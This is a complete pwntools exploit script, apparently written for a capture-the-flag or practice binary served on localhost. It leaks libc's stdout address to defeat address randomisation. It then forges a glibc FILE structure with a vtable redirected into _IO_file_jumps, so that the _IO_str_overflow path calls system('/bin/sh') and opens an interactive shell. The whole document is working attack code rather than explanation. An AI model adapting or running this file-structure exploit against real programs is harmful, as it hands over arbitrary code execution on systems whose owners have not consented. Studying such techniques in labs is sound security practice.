from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-v"]
e = context.binary = ELF(binary,checksec=False)
libc = e.libc

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('127.0.0.1',31337)
    else:
        return process(e.path)

def leak_libc():
   p.recvline()
   stdout_addr = int(p.recvline(),16)
   libc.address = stdout_addr - libc.symbols['_IO_2_1_stdout_']

p = start()

leak_libc()

system = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh"))
io_str_overflow_ptr = libc.symbols['_IO_file_jumps'] + 0xd8
log.info(f"Examine addr _IO_file_jumps + 0xd8 ({hex(io_str_overflow_ptr)})")

fp = FileStructure()
fp._IO_buf_base = 0
fp._IO_buf_end = int((bin_sh-100)/2)
fp._IO_write_ptr = int((bin_sh-100)/2)
fp._IO_write_base = 0
fp._lock = libc.symbols['_IO_2_1_stdout_']-0x10
fp.vtable = io_str_overflow_ptr - 0x10

log.info("FP to satisfy wide_data('/bin/sh') below")
log.info(fp)
pause()

payload = bytes(fp)
payload += p64(system)

pause()

log.info("Sending fp to receive shell")
p.sendline(payload)
p.interactive()
